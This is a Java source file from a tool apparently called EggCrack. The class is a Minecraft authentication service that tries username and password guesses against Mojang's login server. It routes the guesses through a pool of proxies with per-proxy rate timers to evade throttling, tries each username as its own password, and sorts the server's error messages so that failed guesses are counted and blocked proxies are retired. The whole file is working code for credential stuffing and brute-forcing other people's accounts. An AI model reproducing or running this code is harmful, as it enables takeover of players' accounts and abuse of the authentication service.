package net.teamlixo.eggcrack.minecraft;

import com.mojang.authlib.UserAuthentication;
import net.teamlixo.eggcrack.EggCrack;
import net.teamlixo.eggcrack.Tracker;
import net.teamlixo.eggcrack.account.Account;
import net.teamlixo.eggcrack.authentication.AuthenticationException;
import net.teamlixo.eggcrack.credential.password.PasswordAuthenticationService;
import net.teamlixo.eggcrack.timer.IntervalTimer;
import net.teamlixo.eggcrack.timer.Timer;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;
import java.util.NoSuchElementException;

public class MinecraftAuthenticationService extends PasswordAuthenticationService {
    private static final int MINIMUM_PASSWORD_LEGTH = 6;
    private static final InetAddress LOCAL_ADDRESS = InetAddress.getLoopbackAddress();

    /**
     * Authentication factory to use when creating new Mojang authentication instances.
     */
    private AuthenticationFactory authenticationFactory;

    /**
     * Interval each proxy may send requests at, in seconds.
     */
    private float interval;
    private final Map<InetAddress, Timer> intervalMap = new HashMap<InetAddress, Timer>();

    private final Tracker tracker;

    public MinecraftAuthenticationService(AuthenticationFactory authenticationFactory, float interval, Tracker tracker) {
        this.authenticationFactory = authenticationFactory;

        this.interval = interval;

        this.tracker = tracker;
    }

    @Override
    protected boolean authenticate(Account account, String password, Proxy proxy) throws AuthenticationException {
        if (!(account instanceof MinecraftAccount))
            throw new AuthenticationException(AuthenticationException.AuthenticationFailure.INVALID_ACCOUNT);

        return authenticateMinecraft(account.getUsername(), password, proxy);
    }

    private boolean authenticateMinecraft(String username, String password, Proxy proxy) throws AuthenticationException {
        //Ensure username and password are not null.
        if (username == null)
            return false;

        if (password == null) {
            tracker.setAttempts(tracker.getAttempts() + 1);
            return false;
        }

        //Step 1: Check username and password for possible corruptions.

        username = username.trim().replace("\n", "").replace("\r", "");

        if (password.equalsIgnoreCase("%user"))
            password = username;

        password = password.trim().replace("\n", "").replace("\r", "");
        if (password.length() < MINIMUM_PASSWORD_LEGTH) {
            tracker.setAttempts(tracker.getAttempts() + 1);
            return false;
        }

        //Step 2: Check proxy for rate-limiting.

        InetAddress proxyAddress = proxy.type() == Proxy.Type.DIRECT || proxy.address() == null ?
                LOCAL_ADDRESS :
                ((InetSocketAddress)proxy.address()).getAddress();

        if (!intervalMap.containsKey(proxyAddress))
            intervalMap.put(proxyAddress, new IntervalTimer(interval, IntervalTimer.RateWindow.SECOND));

        Timer timer = intervalMap.get(proxyAddress);
        if (!timer.isReady())
            throw new AuthenticationException(AuthenticationException.AuthenticationFailure.BAD_PROXY);

        EggCrack.LOGGER.finer("[Authentication] " + username + ": using proxy [type=" + proxy.type().name() + ",address=" + proxyAddress + "].");

        //Step 3: Attempt to authenticate the user using the username and password.

        UserAuthentication userAuthentication = authenticationFactory.createUserAuthentication(proxy);
        userAuthentication.setUsername(username);
        userAuthentication.setPassword(password);

        try {
            synchronized (tracker) {
                tracker.setRequests(tracker.getRequests() + 1);
            }

            EggCrack.LOGGER.fine("[Authentication] Trying [username=" + username + ", password=" + password + "].");

            userAuthentication.logIn();
            timer.next();

            return userAuthentication.isLoggedIn();
        } catch (com.mojang.authlib.exceptions.AuthenticationException e) {
            timer.next();
            String errorMessage = e.getMessage();

            EggCrack.LOGGER.finer("[Authentication] Attempt [username=" + username + ", password=" + password + "] failed: " + e.getMessage());

            if (errorMessage.equals("Invalid credentials. Invalid username or password.")) {
                //Username or password is not correct.
                synchronized (tracker) {
                    tracker.setAttempts(tracker.getAttempts() + 1);
                }
                
                throw new AuthenticationException(AuthenticationException.AuthenticationFailure.INCORRECT_CREDENTIAL);
            } else if (errorMessage.equals("Invalid credentials.")) {
                throw new AuthenticationException(AuthenticationException.AuthenticationFailure.REJECTED);
            } else if (errorMessage.equals("Cannot contact authentication server")) {
                throw new AuthenticationException(AuthenticationException.AuthenticationFailure.TIMEOUT);
            } else if (errorMessage.equals("Invalid credentials. Account migrated, use e-mail as username.")) {
                throw new AuthenticationException(AuthenticationException.AuthenticationFailure.INVALID_ACCOUNT);
            } else {
                EggCrack.LOGGER.warning("[Authentication] Unexpected response: " + e.getMessage());
                throw new AuthenticationException(AuthenticationException.AuthenticationFailure.REJECTED);
            }
        } catch (NoSuchElementException exception) {
            throw new AuthenticationException(AuthenticationException.AuthenticationFailure.BAD_PROXY);
        }
    }
}
